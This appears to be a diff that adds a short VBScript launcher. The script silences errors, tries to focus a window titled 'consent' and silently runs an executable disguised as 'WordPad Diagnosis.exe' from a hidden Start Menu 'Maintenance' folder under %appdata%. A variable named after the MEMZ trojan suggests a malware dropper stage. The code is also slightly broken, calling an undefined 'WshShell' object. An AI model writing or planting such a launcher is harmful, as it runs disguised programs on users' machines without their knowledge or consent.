@@ -1,0 +1,5 @@
+On Error Resume Next
+Set w = WScript.CreateObject ("WScript.Shell")
+WshShell.AppActivate "consent"
+expandmemz = w.ExpandEnvironmentStrings("""%appdata%\microsoft\windows\Start Menu\Programs\Maintenance\WordPad Diagnosis.exe""")
+w.run expandmemz
